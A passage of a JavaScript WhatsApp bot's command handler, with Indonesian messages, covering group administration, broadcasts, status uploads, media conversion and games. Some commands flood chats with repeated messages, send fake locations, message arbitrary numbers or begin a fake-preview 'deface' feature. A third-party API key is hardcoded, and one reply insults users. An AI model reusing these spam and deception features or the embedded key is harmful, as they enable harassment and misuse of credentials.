			if (!isBotGroupAdmins) return sticNotAdmin(from)
          if (args[0] === 'on') {
          if (bugc === true) return
          bugc = true
          reply('Berhasil menyalakan antibug')
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          reply('Berhasil mematikan antibug')
          } else if (!c){
 anu =`Silahkan pilih salah satu\n\non: untuk mengaktifkan\noff: untuk menonaktifkan`
punten = [{buttonId: 'antibug off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antibug on', buttonText: {displayText: 'ON✔️'}, type: 1}]
const btasu = {
    contentText: `${anu}`,
    footerText: '*_©⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗_*',
    buttons: punten,
    headerType: 1
}
await kurr.sendMessage(from, btasu, MessageType.buttonsMessage, {quoted: ftrol})
					}
          break
				case 'tinyurl':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
try {
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
} catch (e) {
emror = String(e)
reply(`${e}`)
}
break
case 'sharelock':
 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
kurr.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: ofrply}, MessageType.liveLocation, {quoted:floc})
break
case 'tts':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					  try{
        if (args.length > 1) {
        const gtts = require('./lib/gtts')(args[0])
        if (args.length < 2) return kurr.sendMessage(from, 'Textnya mana gan?', text, {quoted: mek})
        ngab = budy.slice(7)
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        ngab.length > 600
        ? reply('Textnya kebanyakan gan')
        : gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply('Gagal gan:(')
                kurr.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	} else if ( args.length === 1 ){
		ngab = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
		const gtts = require('./lib/gtts')(args[0])
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply(mess.error.api)
                kurr.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	}
} catch (e){
	reply(mess.error.api)
}
break 
				case 'demote':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			demote = mek.message.extendedTextMessage.contextInfo.participant
		    kurr.groupDemoteAdmin(from, [demote])
						reply('Sukses demote admin')
						break
					case 'promote':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
				  if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply targetnya!')
			promote = mek.message.extendedTextMessage.contextInfo.participant
		    kurr.groupMakeAdmin(from, [promote])
						reply('Sukses promote member')
						break
				case 'linkgrup':
				case 'linkgroup':
				case 'linkgc':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
					linkgc = await kurr.groupInviteCode(from)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink grup ${groupName}`
					kurr.sendMessage(from, yeh, text, { quoted: mek })
					break
					case 'resetlinkgc':
         case 'resetlinkgroup':
         case 'revoke':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
         if (!isGroup) return reply(mess.only.group)
         if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
          json = ['action', 'inviteReset', from]
         kurr.query({json, expect200: true})
          reply('Sukses Mereset Link Group')
         break
case 'gc': case 'group':
buttonss = [{buttonId: `opengc`, buttonText: {displayText: 'OPEN'}, type: 1},{buttonId: `closegc`, buttonText: {displayText: 'CLOSE'}, type: 1}]
const bMess = {
    contentText: 'OPEN/CLOSE\n\nGroup',
    footerText: 'Silahkan Pilih Saah Satu',
    buttons: buttonss,
    headerType: 1
}
await kurr.sendMessage(from, bMess, MessageType.buttonsMessage, {quoted: ftrol})
break
					case 'opengc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
                   reply(`Sukses membuka grup ${groupName}`)
						kurr.groupSettingChange(from, GroupSettingChange.messageSend, false)
						break
						case 'closegc':
						if (!isGroup) return reply(mess.only.group)
						if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
						reply(`Sukses menutup grup ${groupName}`)
						kurr.groupSettingChange(from, GroupSettingChange.messageSend, true)
					break
				case 'spam':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					kurr.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return sticOwner(from)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return sticNotAdmin(from)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                kurr.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!isOwner && !mek.key.fromMe) return sticOwner(from)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return sticNotAdmin(from)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                kurr.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sticAdmin(from)
              if (!isBotGroupAdmins) return sticNotAdmin(from)
					kurr.groupUpdateSubject(from, `${body.slice(11)}`)
					reply(`Sukses mengganti nama grup ke ${body.slice(11)}`)
					break					
				case 'setdeskgc':
				case 'setdescgc':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return sticAdmin(from)
                   if (!isBotGroupAdmins) return sticNotAdmin(from)
					kurr.groupUpdateDescription(from, `${body.slice(10)}`)
					reply(`Sukses mengganti deskripsi grup ke ${body.slice(10)}`)
					break
				case 'setprofile':
				case 'setpp':
				kurr.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await kurr.downloadAndSaveMediaMessage(enmediau)
					await kurr.updateProfilePicture(botNumber, mediau)
					reply('Sukses')
					break
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				kurr.updatePresence(from, Presence.composing)
				kurr.groupLeave(from)
						break
				case 'bc':
					kurr.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
					if (args.length < 1) return reply('Teksnya?')
					anu = await kurr.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await kurr.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							kurr.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await kurr.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							kurr.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await kurr.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							kurr.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							//sendMess(_.jid, `${body.slice(4)}`)
buttons = [{buttonId: `menu`, buttonText: {displayText: '🇲🇨MENU'}, type: 1},{buttonId: `owner`, buttonText: {displayText: '🛐OWNER'}, type: 1}]
const btnbc = {
    contentText: `${body.slice(4)}`,
    footerText: '*_BROADCAST_*',
    buttons: buttons,
    headerType: 1
}
await kurr.sendMessage(_.jid, btnbc, MessageType.buttonsMessage, {quoted: ftrol})
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
					case 'spamsw':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					kurr.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
				case 'upswteks':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    kurr.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    kurr.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`Kurz Bot Assistan`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await kurr.downloadMediaMessage(encmedia)
						kurr.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await kurr.downloadMediaMessage(encmedia)
						kurr.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await kurr.downloadMediaMessage(encmedia)
						kurr.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var konti = body.slice(11)
                    sticWait(from)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await kurr.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    kurr.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var konti = body.slice(7)
                    sticWait(from)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await kurr.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    kurr.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                    var teksyy = body.slice(11)
                    sticWait(from)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await kurr.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    kurr.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				return kurr.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'tomp4':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isQuotedSticker) return reply('Reply stiker nya')
                                        sticWait(from)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await kurr.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result)
            })
            }else {
            reply('Reply Stickernya!')
            }
            fs.unlinkSync(owgi)
            break
            case 'tomp3':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					kurr.updatePresence(from, Presence.composing)
					if (!isQuotedVideo) return reply('Reply Video Nya Kak')
					sticWait(from)
					encmediad = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					mediad = await kurr.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						kurr.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
				case 'suit':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
  if (args.length < 1) return reply('Pilih gunting/batu/kertas')
					if (args[0] === 'gunting' ) {
					  gunting = [
					    "Kamu *Gunting*\nAku *Kertas*\nKamu Menang 😔",
					    "Kamu *Gunting*\nAku *Batu*\nKamu Kalah 🙂",
					    "Kamu *Gunting*\nAku *Gunting*\nKita Seri 😏"
					    ]
					  gun = gunting[Math.floor(Math.random() * gunting.length)]
					  reply(gun)
					} else if (args[0] === 'kertas') {
					  ker = [
					    "Kamu *Kertas*\nAku *Batu*\nKamu Menang 😔",
					    "Kamu *Kertas*\nAku *Gunting*\nKamu Kalah 🙂",
					    "Kamu *Kertas*\nAku *Kertas*\nKita Seri 😏"
					    ]
					  kertas = ker[Math.floor(Math.random() * ker.length)]
						reply(kertas)
					} else if (args[0] === 'batu') {
					  bat = [
					    "Kamu *Batu*\nAku *Gunting*\nKamu Menang ??",
					    "Kamu *Batu*\nAku *Kertas*\nKamu Kalah 🙂",
					    "Kamu *Batu*\nAku *Batu*\nKita Seri 😏"
					    ]
					  batu = bat[Math.floor(Math.random() * bat.length)]
					  reply(batu)
					} else {
					  reply('Pilih gunting/batu/kertas')
					}
break
		    case 'slot':
            case 'slots':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            kurr.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: mek })
            break
				case 'kontak':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
					argzu = arg.split('|')
				if (!argzu) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					sendKontak(from, mentioned[0].split('@')[0], argzu[1])
				} else {
					sendKontak(from, argzu[0], argzu[1])
				}
				break
				case 'kontag':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
				if (!isGroupAdmins) return sticAdmin(from)
                argzi = arg.split('|')
				if (!argzi) return reply(`Penggunaan ${prefix}kontak @tag|nama`)
				if (mek.message.extendedTextMessage != undefined){
                    		mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					hideTagKontak(from, mentioned[0].split('@')[0], argzi[1])
				} else {
					hideTagKontak(from, argzi[0], argzi[1])
				}
				break
				case 'getdeskgc':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				if (!isGroup) return reply(mess.only.group)
					anu = from
			   metadete = await kurr.groupMetadata(anu)
				kurr.sendMessage(from, metadete.desc, text, {quoted:mek})
				  break
					case 'getbio':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
	  var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await kurr.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply(mess.error.api)
}
break
                    case 'getname':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
        var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = kurr.contacts[ambl] != undefined ? kurr.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : kurr.contacts[ambl].notify || kurr.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!isGroup) return reply(mess.only.group)
            mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            pictt = await kurr.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            kurr.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            kurr.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
				case 'attp':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp Herman Chanel`)
					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
					kurr.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
                case 'ttp4':  
				case 'ttp2':  
				case 'ttp3':  
				case 'ttp':  
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
					if (!c) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}attp ${NamaBot}`)
					atetepe = await getBuffer(`https://api.lolhuman.xyz/api/${command}?apikey=KurrXd&text=${encodeURIComponent(c)}`)
					kurr.sendMessage(from, atetepe, sticker, { quoted: mek })
					break
				case 'semoji':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			if (args === 0) return reply('emojinya?')   
		   aku4 = args.join(' ')
           emoji.get(`${aku4}`).then(emoji => {
           link = `${emoji.images[10].url}`
		   sendWebp(from, `${link}`).catch(() => reply('gagal'))
           })
    	   break
				case 'tag':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					kurr.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					kurr.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
				case 'join': 
              reply('PUNYA TANGAN KAN MANUAL LAH GOBLOK')
              break
				case 'totag':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return sticAdmin(from)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await kurr.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await kurr.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            kurr.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await kurr.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await kurr.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            kurr.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await kurr.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await kurr.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4', duration: 359996400,
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            kurr.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
         } else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await kurr.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await kurr.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            kurr.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
            encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await kurr.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await kurr.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'text/plain',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            kurr.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await kurr.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            var group = await kurr.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4', duration: 359996400,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            kurr.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/dokumen/gif/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
				case 'status':
case 'stats':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
				var groups = kurr.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = kurr.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					uptime = process.uptime();
					const timestampu = speed();
					const totalChat = await kurr.chats.all()
					const latensi = speed() - timestampu
					var total = math(`${groups.length} ${privat.length}`)
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = kurr.user.phone
					stamtus = `⍟ ────────────────── ⍟

Private Chat : ${privat.length}
Group Chat : ${groups.length}
Total Chat : ${totalChat.length}
Speed : ${latensi.toFixed(4)} second
Runtime : ${kyun(uptime)}
Baterai : ${baterai.battery}
Charged : ${baterai.isCharge}
Mode : ${publik ? 'public' : 'self'}
Prefix : ${multi ? 'Multi Prefix' : 'No Prefix'}
Penggunaan Ram : ${ram2}
Hostname : ${os.hostname()}
Platform : ${os.platform()}
Uptime : ${kyun(os.uptime())}
MNC : ${mnc}
MCC : ${mcc}
Device Model: ${kurr.user.phone.device_model}
Device Manufactur : ${device_manufacturer}
Wa Version: ${kurr.user.phone.wa_version}
Os Version: ${kurr.user.phone.os_version}

⍟ ────────────────── ⍟`
reply(stamtus)
break
				case 'tobc':
				if (!isOwner && !mek.key.fromMe) return sticOwner(from)
				kurr.updatePresence(from, Presence.composing)
					anu = await kurr.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await kurr.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							kurr.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await kurr.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							kurr.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
          reply('reply sticker/audio')
							}
					break
					case 'fdeface':
              if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
var nn = body.slice(9)
                                var urlnye = nn.split("|")[0];
